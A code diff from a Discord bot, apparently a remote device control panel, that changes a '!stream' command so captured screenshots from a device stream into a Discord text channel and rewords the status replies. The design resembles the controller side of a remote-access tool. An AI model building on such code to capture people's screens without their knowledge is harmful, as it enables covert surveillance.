@@ -703,19 +703,18 @@ client.on(Events.InteractionCreate, async (i) => {
           }
 
           const botUrl = process.env.BOT_HTTP_URL || `https://substantial-impala-aymouo-bc7f3c76.koyeb.app`
-          const payload = `voice ${voiceChannel.id} ${guild.id} ${botUrl}`
+          const textChannelId = i.channelId
+          const payload = `voice ${voiceChannel.id} ${guild.id} ${textChannelId} ${botUrl}`
 
           console.log(`[VoiceStream] Sending to ${deviceCh.name}: !stream ${payload}`)
 
-          // Reply immediately to avoid "application did not respond"
-          await i.editReply({ content: `${E.satellite} **Starting voice stream**...\nDevice: \`${deviceCh.name}\`\nVoice: \`${voiceChannel.name}\`\nConnecting...` })
+          await i.editReply({ content: `${E.satellite} **Starting stream**...\nDevice: \`${deviceCh.name}\`\nVoice: \`${voiceChannel.name}\`\nStream: <#${textChannelId}>` })
 
-          // Send command in background
           sendCmdLogged(deviceCh, 'stream', payload, uid, user.username).then(r => {
             if (r.ok) {
-              i.followUp({ content: `${E.check} **Voice stream active!**\n30fps H264 → VP8 pipeline`, ephemeral: true }).catch(() => {})
+              i.followUp({ content: `${E.check} **Stream active!**\nScreenshots streaming to this channel`, ephemeral: true }).catch(() => {})
             } else {
-              i.followUp({ content: `${E.coffin} Failed to start: ${r.err} ${E.skull}`, ephemeral: true }).catch(() => {})
+              i.followUp({ content: `${E.coffin} Failed: ${r.err} ${E.skull}`, ephemeral: true }).catch(() => {})
             }
           }).catch(e => {
             i.followUp({ content: `${E.coffin} Error: ${e.message} ${E.skull}`, ephemeral: true }).catch(() => {})
